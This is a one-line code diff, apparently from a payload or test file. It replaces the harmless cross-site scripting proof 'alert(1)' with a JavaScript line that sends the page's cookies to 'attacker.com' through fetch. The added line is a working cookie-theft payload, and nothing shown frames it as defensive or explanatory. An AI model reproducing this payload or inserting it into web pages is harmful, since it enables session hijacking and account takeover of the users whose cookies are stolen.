@@ -1,1 +1,1 @@
-alert(1)
+fetch('https://attacker.com/leak?cookie=' + document.cookie);
